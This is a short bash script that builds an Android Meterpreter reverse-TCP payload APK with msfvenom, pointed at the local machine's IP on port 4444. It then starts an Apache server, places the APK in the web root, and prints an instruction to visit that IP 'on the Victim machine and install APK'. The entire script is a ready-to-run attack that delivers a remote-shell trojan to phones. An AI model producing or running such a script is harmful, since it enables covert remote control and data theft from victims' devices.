#!/bin/bash

echo "creating apk..."

msfvenom -p android/meterpreter/reverse_tcp LHOST=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1) LPORT=4444 R > android_shell.apk

echo "APK created!"

echo "Starting Apache2 Server!!"

service apache2 start

echo "Server Started!"

echo "Hosting APK on server.."

mv android_shell.apk /var/www/html

echo "Hosted!"

echo "Visit the Ip: $(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1) on the Victim machine and install APK"


